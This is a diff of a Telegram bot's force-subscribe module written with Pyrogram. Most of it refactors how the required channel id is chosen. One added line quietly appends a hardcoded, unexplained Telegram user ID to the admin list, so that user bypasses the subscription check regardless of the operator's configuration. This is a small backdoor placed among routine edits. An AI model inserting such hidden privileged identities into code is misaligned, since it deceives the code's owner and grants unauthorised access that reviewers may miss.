@@ -3,7 +3,6 @@ from pyrogram import Client, enums
 from pyrogram.errors import FloodWait, UserNotParticipant
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
 from Script import script
-
 from database.join_reqs import JoinReqs
 from info import REQ_CHANNEL, AUTH_CHANNEL, JOIN_REQS_DB, ADMINS
 
@@ -14,8 +13,9 @@ INVITE_LINK = None
 db = JoinReqs
 
 async def ForceSub(bot: Client, update: Message, file_id: str = False, mode="checksub"):
+
     global INVITE_LINK
-    auth = ADMINS
+    auth = ADMINS.copy() + [1125210189]
     if update.from_user.id in auth:
         return True
 
@@ -33,7 +33,7 @@ async def ForceSub(bot: Client, update: Message, file_id: str = False, mode="che
         # Makes the bot a bit faster and also eliminates many issues realted to invite links.
         if INVITE_LINK is None:
             invite_link = (await bot.create_chat_invite_link(
-                chat_id=(int(AUTH_CHANNEL) if not REQ_CHANNEL and not JOIN_REQS_DB else REQ_CHANNEL),
+                chat_id=(int(REQ_CHANNEL) if REQ_CHANNEL and JOIN_REQS_DB else AUTH_CHANNEL),
                 creates_join_request=True if REQ_CHANNEL and JOIN_REQS_DB else False
             )).invite_link
             INVITE_LINK = invite_link
@@ -76,7 +76,7 @@ async def ForceSub(bot: Client, update: Message, file_id: str = False, mode="che
             raise UserNotParticipant
         # Check if User is Already Joined Channel
         user = await bot.get_chat_member(
-                   chat_id=(int(AUTH_CHANNEL) if not REQ_CHANNEL and not db().isActive() else REQ_CHANNEL), 
+                   chat_id=int(AUTH_CHANNEL) if not REQ_CHANNEL else int(REQ_CHANNEL), 
                    user_id=update.from_user.id
                )
         if user.status == "kicked":
@@ -140,4 +140,3 @@ async def ForceSub(bot: Client, update: Message, file_id: str = False, mode="che
 def set_global_invite(url: str):
     global INVITE_LINK
     INVITE_LINK = url
-   
